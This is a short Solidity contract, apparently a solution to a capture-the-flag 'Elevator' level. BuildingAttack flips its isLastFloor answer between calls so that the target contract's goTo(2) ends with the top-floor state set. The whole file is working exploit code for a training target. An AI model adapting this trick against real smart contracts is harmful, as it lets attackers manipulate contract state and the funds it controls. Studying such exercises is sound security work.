// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./target/Elevator.sol";

contract BuildingAttack {
    bool flip;
    Elevator elevator;

    constructor(address _elevator) {
        flip = false;
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(2);
    }

    function isLastFloor(uint) public returns (bool) {
        bool _flip = flip;
        flip = !flip;
        return _flip;
    }
}
